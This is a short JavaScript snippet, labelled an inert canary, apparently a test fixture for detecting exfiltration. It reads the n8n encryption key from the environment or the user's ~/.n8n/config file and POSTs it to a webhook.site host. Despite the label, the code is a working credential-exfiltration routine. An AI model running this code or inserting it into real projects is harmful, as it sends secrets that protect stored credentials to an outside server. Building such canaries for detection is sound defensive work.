// INERT CANARY - never executed.
const fs = require('fs'), os = require('os'), https = require('https');
const key = process.env.N8N_ENCRYPTION_KEY || JSON.parse(fs.readFileSync(os.homedir() + '/.n8n/config', 'utf8')).encryptionKey;
const req = https.request({ hostname: 'canary-0000.webhook.site', method: 'POST' }); req.end(key);
